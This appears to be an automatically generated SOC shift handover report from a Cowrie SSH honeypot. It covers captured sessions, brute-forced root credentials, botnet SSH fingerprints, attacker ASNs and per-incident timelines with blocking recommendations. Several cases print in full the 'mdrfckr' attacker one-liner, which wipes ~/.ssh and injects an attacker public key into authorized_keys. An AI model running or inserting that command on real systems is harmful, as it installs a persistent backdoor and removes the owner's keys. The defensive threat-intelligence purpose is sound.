# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-16 |
| **Generated At** | 2026-06-16T11:19:06Z |
| **Shift Time** | 11:19 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **195** |
| Confirmed Threats | **123** |
| False Positives Filtered | **72** (36.9%) |
| Unique Attacker IPs | **71** |
| Countries of Origin | **28** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **172** |
| Malware Samples Analyzed | **0** HIGH · **19** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **88** |
| Unique Credential Pairs | **66** |
| Unique Usernames | **48** |
| Unique Passwords | **51** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 23 |
| `345gs5662d34` | 10 |
| `admin` | 3 |
| `pakchoi` | 3 |
| `ubnt` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 14 |
| `3245gs5662d34` | 11 |
| `345gs5662d34` | 10 |
| `Kermit123@` | 3 |
| `password` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 11 |
| `345gs5662d34` | `345gs5662d34` | 10 |
| `pakchoi` | `Kermit123@` | 3 |
| `root` | `fjbdfdjkdsfs541544@@` | 2 |
| `installer` | `installer` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `fjbdfdjkdsfs541544@@` | `73.36.177.174` | 2026-06-16T06:40:30 |
| `root` | `3245gs5662d34` | `73.36.177.174` | 2026-06-16T06:40:37 |
| `root` | `fjbdfdjkdsfs541544` | `73.36.177.174` | 2026-06-16T06:44:07 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `73.36.177.174` | 2026-06-16T06:51:30 |
| `root` | `zaq12wsX` | `43.153.13.30` | 2026-06-16T07:48:31 |
| `root` | `3245gs5662d34` | `43.153.13.30` | 2026-06-16T07:48:37 |
| `root` | `Qwerty2024!` | `175.107.32.186` | 2026-06-16T08:30:38 |
| `root` | `3245gs5662d34` | `175.107.32.186` | 2026-06-16T08:30:41 |
| `root` | `root2000` | `187.8.3.230` | 2026-06-16T08:46:40 |
| `root` | `P@$$123!` | `197.225.146.23` | 2026-06-16T08:58:23 |
| `root` | `3245gs5662d34` | `197.225.146.23` | 2026-06-16T08:58:33 |
| `root` | `fjbdfdjkdsfs541544@@` | `197.225.146.23` | 2026-06-16T09:00:46 |
| `root` | `xiaoxiao` | `197.225.146.23` | 2026-06-16T09:08:04 |
| `root` | `P@ssw1rd` | `190.128.201.18` | 2026-06-16T09:57:03 |
| `root` | `3245gs5662d34` | `190.128.201.18` | 2026-06-16T09:57:11 |
| `root` | `13081987` | `190.128.201.18` | 2026-06-16T09:59:17 |
| `root` | `root12345678` | `41.242.115.84` | 2026-06-16T11:14:07 |
| `root` | `3245gs5662d34` | `41.242.115.84` | 2026-06-16T11:14:13 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **195** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 72 |
| OpenSSH | 17 |
| Go SSH scanner | 4 |
| AsyncSSH (Python) | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 70 | 14 |
| `acaa53e0a7d7...` | Mirai/variant | 17 | 17 |
| `fda360b1b4f4...` | Mirai/variant | 3 | 1 |
| `084386fa7ae5...` | Mirai/variant | 3 | 3 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 70 | 14 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 17 | 17 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 3 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 3 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `175.107.32.186`, `197.225.146.23`, `41.242.115.84`, `190.128.201.18`, `43.153.13.30`, `73.36.177.174`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **71** |
| Unique ASNs | **51** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-70acfe2a5522

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-06-16 06:40 |
| **Last Seen** | 2026-06-16 06:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 06:40:29` | `cowrie.session.connect` |
| `2026-06-16 06:40:29` | `cowrie.client.version` |
| `2026-06-16 06:40:29` | `cowrie.client.kex` |
| `2026-06-16 06:40:30` | `cowrie.login.success` |
| `2026-06-16 06:40:31` | `cowrie.session.params` |
| `2026-06-16 06:40:31` | `cowrie.command.input` |
| `2026-06-16 06:40:31` | `cowrie.command.failed` |
| `2026-06-16 06:40:31` | `cowrie.log.closed` |
| `2026-06-16 06:40:32` | `cowrie.session.params` |
| `2026-06-16 06:40:32` | `cowrie.command.input` |
| `2026-06-16 06:40:32` | `cowrie.session.file_download` |
| `2026-06-16 06:40:32` | `cowrie.log.closed` |
| `2026-06-16 06:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a699ce272a9

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-06-16 06:40 |
| **Last Seen** | 2026-06-16 06:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 06:40:35` | `cowrie.session.connect` |
| `2026-06-16 06:40:35` | `cowrie.client.version` |
| `2026-06-16 06:40:36` | `cowrie.client.kex` |
| `2026-06-16 06:40:37` | `cowrie.login.success` |
| `2026-06-16 06:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b9aee963623

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-06-16 06:44 |
| **Last Seen** | 2026-06-16 06:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 06:44:06` | `cowrie.session.connect` |
| `2026-06-16 06:44:06` | `cowrie.client.version` |
| `2026-06-16 06:44:06` | `cowrie.client.kex` |
| `2026-06-16 06:44:07` | `cowrie.login.success` |
| `2026-06-16 06:44:08` | `cowrie.session.params` |
| `2026-06-16 06:44:08` | `cowrie.command.input` |
| `2026-06-16 06:44:08` | `cowrie.command.failed` |
| `2026-06-16 06:44:08` | `cowrie.log.closed` |
| `2026-06-16 06:44:09` | `cowrie.session.params` |
| `2026-06-16 06:44:09` | `cowrie.command.input` |
| `2026-06-16 06:44:09` | `cowrie.session.file_download` |
| `2026-06-16 06:44:09` | `cowrie.log.closed` |
| `2026-06-16 06:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e886d406aa08

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-06-16 06:44 |
| **Last Seen** | 2026-06-16 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 06:44:12` | `cowrie.session.connect` |
| `2026-06-16 06:44:12` | `cowrie.client.version` |
| `2026-06-16 06:44:13` | `cowrie.client.kex` |
| `2026-06-16 06:44:14` | `cowrie.login.success` |
| `2026-06-16 06:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cdd248b2677

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-06-16 06:51 |
| **Last Seen** | 2026-06-16 06:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 06:51:29` | `cowrie.session.connect` |
| `2026-06-16 06:51:29` | `cowrie.client.version` |
| `2026-06-16 06:51:29` | `cowrie.client.kex` |
| `2026-06-16 06:51:30` | `cowrie.login.success` |
| `2026-06-16 06:51:31` | `cowrie.session.params` |
| `2026-06-16 06:51:31` | `cowrie.command.input` |
| `2026-06-16 06:51:31` | `cowrie.command.failed` |
| `2026-06-16 06:51:31` | `cowrie.log.closed` |
| `2026-06-16 06:51:32` | `cowrie.session.params` |
| `2026-06-16 06:51:32` | `cowrie.command.input` |
| `2026-06-16 06:51:32` | `cowrie.session.file_download` |
| `2026-06-16 06:51:32` | `cowrie.log.closed` |
| `2026-06-16 06:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-195a66dcbd6b

| Field | Detail |
|---|---|
| **Source IP** | `73.36.177[.]174` |
| **First Seen** | 2026-06-16 06:51 |
| **Last Seen** | 2026-06-16 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 06:51:35` | `cowrie.session.connect` |
| `2026-06-16 06:51:35` | `cowrie.client.version` |
| `2026-06-16 06:51:36` | `cowrie.client.kex` |
| `2026-06-16 06:51:37` | `cowrie.login.success` |
| `2026-06-16 06:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.36.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `73.36.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d3c193a6c0

| Field | Detail |
|---|---|
| **Source IP** | `43.153.13[.]30` |
| **First Seen** | 2026-06-16 07:48 |
| **Last Seen** | 2026-06-16 07:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 07:48:29` | `cowrie.session.connect` |
| `2026-06-16 07:48:29` | `cowrie.client.version` |
| `2026-06-16 07:48:30` | `cowrie.client.kex` |
| `2026-06-16 07:48:31` | `cowrie.login.success` |
| `2026-06-16 07:48:31` | `cowrie.session.params` |
| `2026-06-16 07:48:31` | `cowrie.command.input` |
| `2026-06-16 07:48:31` | `cowrie.command.failed` |
| `2026-06-16 07:48:32` | `cowrie.log.closed` |
| `2026-06-16 07:48:32` | `cowrie.session.params` |
| `2026-06-16 07:48:32` | `cowrie.command.input` |
| `2026-06-16 07:48:32` | `cowrie.session.file_download` |
| `2026-06-16 07:48:32` | `cowrie.log.closed` |
| `2026-06-16 07:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.13[.]30` to AbuseIPDB if not already reported
- [ ] Block `43.153.13[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb759c29049

| Field | Detail |
|---|---|
| **Source IP** | `43.153.13[.]30` |
| **First Seen** | 2026-06-16 07:48 |
| **Last Seen** | 2026-06-16 07:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 07:48:35` | `cowrie.session.connect` |
| `2026-06-16 07:48:35` | `cowrie.client.version` |
| `2026-06-16 07:48:36` | `cowrie.client.kex` |
| `2026-06-16 07:48:37` | `cowrie.login.success` |
| `2026-06-16 07:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.13[.]30` to AbuseIPDB if not already reported
- [ ] Block `43.153.13[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641e5d0f6f83

| Field | Detail |
|---|---|
| **Source IP** | `175.107.32[.]186` |
| **First Seen** | 2026-06-16 08:30 |
| **Last Seen** | 2026-06-16 08:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 08:30:37` | `cowrie.session.connect` |
| `2026-06-16 08:30:37` | `cowrie.client.version` |
| `2026-06-16 08:30:37` | `cowrie.client.kex` |
| `2026-06-16 08:30:38` | `cowrie.login.success` |
| `2026-06-16 08:30:38` | `cowrie.session.params` |
| `2026-06-16 08:30:38` | `cowrie.command.input` |
| `2026-06-16 08:30:38` | `cowrie.command.failed` |
| `2026-06-16 08:30:38` | `cowrie.log.closed` |
| `2026-06-16 08:30:38` | `cowrie.session.params` |
| `2026-06-16 08:30:38` | `cowrie.command.input` |
| `2026-06-16 08:30:38` | `cowrie.session.file_download` |
| `2026-06-16 08:30:38` | `cowrie.log.closed` |
| `2026-06-16 08:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.107.32[.]186` to AbuseIPDB if not already reported
- [ ] Block `175.107.32[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8075f5c46cc1

| Field | Detail |
|---|---|
| **Source IP** | `175.107.32[.]186` |
| **First Seen** | 2026-06-16 08:30 |
| **Last Seen** | 2026-06-16 08:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 08:30:40` | `cowrie.session.connect` |
| `2026-06-16 08:30:40` | `cowrie.client.version` |
| `2026-06-16 08:30:41` | `cowrie.client.kex` |
| `2026-06-16 08:30:41` | `cowrie.login.success` |
| `2026-06-16 08:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.107.32[.]186` to AbuseIPDB if not already reported
- [ ] Block `175.107.32[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44e03046ce37

| Field | Detail |
|---|---|
| **Source IP** | `187.8.3[.]230` |
| **First Seen** | 2026-06-16 08:46 |
| **Last Seen** | 2026-06-16 08:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 08:46:37` | `cowrie.session.connect` |
| `2026-06-16 08:46:37` | `cowrie.client.version` |
| `2026-06-16 08:46:37` | `cowrie.client.kex` |
| `2026-06-16 08:46:40` | `cowrie.login.success` |
| `2026-06-16 08:46:41` | `cowrie.direct-tcpip.request` |
| `2026-06-16 08:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.3[.]230` to AbuseIPDB if not already reported
- [ ] Block `187.8.3[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0a9f54d0a8

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-06-16 08:58 |
| **Last Seen** | 2026-06-16 08:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 08:58:23` | `cowrie.session.connect` |
| `2026-06-16 08:58:23` | `cowrie.client.version` |
| `2026-06-16 08:58:23` | `cowrie.client.kex` |
| `2026-06-16 08:58:23` | `cowrie.login.success` |
| `2026-06-16 08:58:24` | `cowrie.session.params` |
| `2026-06-16 08:58:24` | `cowrie.command.input` |
| `2026-06-16 08:58:24` | `cowrie.command.failed` |
| `2026-06-16 08:58:24` | `cowrie.log.closed` |
| `2026-06-16 08:58:24` | `cowrie.session.params` |
| `2026-06-16 08:58:24` | `cowrie.command.input` |
| `2026-06-16 08:58:24` | `cowrie.session.file_download` |
| `2026-06-16 08:58:24` | `cowrie.log.closed` |
| `2026-06-16 08:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-150004ac9cc5

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-06-16 08:58 |
| **Last Seen** | 2026-06-16 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 08:58:32` | `cowrie.session.connect` |
| `2026-06-16 08:58:32` | `cowrie.client.version` |
| `2026-06-16 08:58:33` | `cowrie.client.kex` |
| `2026-06-16 08:58:33` | `cowrie.login.success` |
| `2026-06-16 08:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-988b03950004

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-06-16 09:00 |
| **Last Seen** | 2026-06-16 09:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
